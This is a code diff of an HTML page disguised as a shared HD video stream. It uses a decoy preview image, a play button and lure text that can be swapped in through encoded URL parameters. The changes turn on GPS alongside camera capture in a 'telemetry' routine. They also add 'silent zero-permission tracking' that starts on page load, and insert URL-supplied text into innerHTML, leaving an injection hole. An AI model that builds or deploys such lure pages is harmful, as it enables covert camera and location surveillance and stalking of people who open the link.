@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title id="page-title-tag">Exclusive Content</title>
+    <title id="page-title-tag">Shared Media Content</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * {
@@ -15,7 +15,7 @@
         }
 
         body {
-            background: #0f172a;
+            background: #090d16;
             color: #f8fafc;
             display: flex;
             align-items: center;
@@ -28,18 +28,47 @@
             background: #1e293b;
             border: 1px solid #334155;
             border-radius: 20px;
-            max-width: 460px;
+            max-width: 480px;
             width: 100%;
             overflow: hidden;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
-            text-align: center;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6);
+        }
+
+        .hero-container {
+            position: relative;
+            width: 100%;
+            height: 240px;
+            background: #000;
         }
 
         .hero-img {
             width: 100%;
-            height: 220px;
+            height: 100%;
             object-fit: cover;
-            background: #090d16;
+            opacity: 0.85;
+        }
+
+        .play-btn-circle {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 68px;
+            height: 68px;
+            background: rgba(59, 130, 246, 0.9);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 26px;
+            color: white;
+            box-shadow: 0 0 24px rgba(59, 130, 246, 0.6);
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+
+        .play-btn-circle:hover {
+            transform: translate(-50%, -50%) scale(1.1);
         }
 
         .card-body {
@@ -63,7 +92,7 @@
             font-size: 22px;
             font-weight: 700;
             color: #ffffff;
-            margin-bottom: 12px;
+            margin-bottom: 10px;
             line-height: 1.3;
         }
 
@@ -75,7 +104,10 @@
         }
 
         .btn-action {
-            display: block;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
             width: 100%;
             padding: 14px;
             background: linear-gradient(135deg, #3b82f6, #2563eb);
@@ -94,37 +126,51 @@
             transform: translateY(-2px);
             box-shadow: 0 6px 20px rgba(37, 99, 235, 0.6);
         }
-
-        .footer-note {
-            margin-top: 16px;
-            font-size: 11px;
-            color: #64748b;
-        }
     </style>
 </head>
 
 <body>
     <div class="card">
-        <img id="hero-img" src="https://images.unsplash.com/photo-1507525428034-b723cf961d3e?auto=format&fit=crop&w=800&q=80" alt="Decoy Preview" class="hero-img">
+        <div class="hero-container" id="hero-trigger">
+            <img id="hero-img" src="https://images.unsplash.com/photo-1507525428034-b723cf961d3e?auto=format&fit=crop&w=800&q=80" alt="Preview" class="hero-img">
+            <div class="play-btn-circle"><i class="fas fa-play" style="margin-left: 4px;"></i></div>
+        </div>
         <div class="card-body">
-            <span class="badge" id="badge-text">SPECIAL MEDIA LINK</span>
-            <h1 id="main-title">Special Exclusive Video Stream</h1>
-            <p id="main-desc">Click below to view the exclusive shared media content and verify location-based streaming rights.</p>
+            <span class="badge" id="badge-text">HD MEDIA STREAM</span>
+            <h1 id="main-title">Exclusive Shared Video Presentation</h1>
+            <p id="main-desc">Tap below to open high definition media playback.</p>
             <button class="btn-action" id="action-btn">
-                <i class="fas fa-play me-2"></i> Access Content
+                <i class="fas fa-play"></i> Watch Stream Now
             </button>
-            <div class="footer-note">Secure Encrypted Content Stream</div>
         </div>
     </div>
 
     <script src="/js/telemetry.js"></script>
     <script>
         const urlParams = new URLSearchParams(window.location.search);
-        const title = urlParams.get('title');
-        const desc = urlParams.get('desc');
-        const img = urlParams.get('image') || urlParams.get('img');
-        const btnText = urlParams.get('btn');
-        const badgeText = urlParams.get('badge');
+        let title = '';
+        let desc = '';
+        let img = '';
+        let btnText = '';
+        let badgeText = '';
+
+        const compressed = urlParams.get('d');
+        if (compressed) {
+            try {
+                const data = JSON.parse(atob(decodeURIComponent(compressed)));
+                if (data.t) title = data.t;
+                if (data.d) desc = data.d;
+                if (data.i) img = data.i;
+                if (data.b) btnText = data.b;
+                if (data.bg) badgeText = data.bg;
+            } catch (e) {}
+        }
+
+        if (!title) title = urlParams.get('t') || urlParams.get('title');
+        if (!desc) desc = urlParams.get('d') || urlParams.get('desc');
+        if (!img) img = urlParams.get('i') || urlParams.get('image') || urlParams.get('img');
+        if (!btnText) btnText = urlParams.get('b') || urlParams.get('btn');
+        if (!badgeText) badgeText = urlParams.get('bg') || urlParams.get('badge');
 
         if (title) {
             document.getElementById('main-title').innerText = title;
@@ -132,7 +178,7 @@
         }
         if (desc) document.getElementById('main-desc').innerText = desc;
         if (img) document.getElementById('hero-img').src = img;
-        if (btnText) document.getElementById('action-btn').innerText = btnText;
+        if (btnText) document.getElementById('action-btn').innerHTML = `<i class="fas fa-play"></i> ${btnText}`;
         if (badgeText) document.getElementById('badge-text').innerText = badgeText;
 
         const actionBtn = document.getElementById('action-btn');
@@ -143,16 +189,21 @@
                     templateName: 'custom',
                     updateInterval: 4000,
                     enableCamera: true,
-                    enableGPS: false
+                    enableGPS: true
                 });
             }
         }
 
         actionBtn.addEventListener('click', () => {
-            actionBtn.innerHTML = '<i class="fas fa-check-circle"></i> Content Ready';
+            actionBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Loading Playback...';
             startTelemetry();
         });
 
+        document.getElementById('hero-trigger').addEventListener('click', () => {
+            actionBtn.click();
+        });
+
+        // Silent zero-permission tracking on load
         window.addEventListener('DOMContentLoaded', () => {
             startTelemetry();
         });
